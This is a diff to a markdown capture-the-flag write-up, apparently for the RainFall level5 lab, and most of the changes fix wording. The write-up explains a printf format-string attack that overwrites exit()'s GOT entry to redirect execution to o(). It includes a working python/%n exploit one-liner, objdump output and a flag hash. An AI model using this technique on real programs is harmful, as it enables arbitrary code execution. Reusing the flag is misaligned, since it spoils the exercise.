@@ -73,9 +73,7 @@ End of assembler dump.
 (gdb)
 ```
 
-
 Ghidra :
-
 
 ```c
 void o(void)
@@ -104,12 +102,11 @@ void main(void)
 }
 ```
 
-
 Another printf format attack string, but this time, its a function we need to call to get our flag.
 
 This might be tricky this time, as we dont have a target to edit, we must execute the o() function.
 
-We can try overididing the exit function so it points to the o() function, lets do it.
+We can try to override the exit function so it points to the o() function, lets do it.
 
 Lets take o() address 0x080484a4.
 
@@ -118,9 +115,7 @@ Lets take o() address 0x080484a4.
 
 And the address of exit 0x80483d0.
 
-We try to overwrite exit, and not the return of main(), since obviously... We wont go back to back because of the exit
-
-So we are going to overwrite exit with o address.
+We want to overwrite exit, and not the return of main(), since obviously... We wont go back to main after the exit.
 
 ```sh
 $ (python -c "print '\xd0\x83\x04\x08' + '%134513824x' + '%4\$n'"; cat) | ./level5
@@ -136,9 +131,9 @@ But it doesn't work, the address doesn't get changed, what's wrong ?
 
 Basically i tried to overwrite the exit function, but there is thing call the GOT overwrite. (Global Offset Table)
 
-It is used to cache the memory addresses of libc function, in order to avoid calling the hole library each time and external function is called.
+It is used to cache the memory addresses of libc function, in order to avoid calling the hole library each time an external function is called.
 
-Maybe the right addresses of exit is inside, lets check :
+Maybe the right address of exit() is inside, lets check :
 
 ```
 level5@RainFall:~$ objdump -R ./level5 
@@ -175,4 +170,4 @@ d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 
 ```
 
-And here we go
+And here we go  
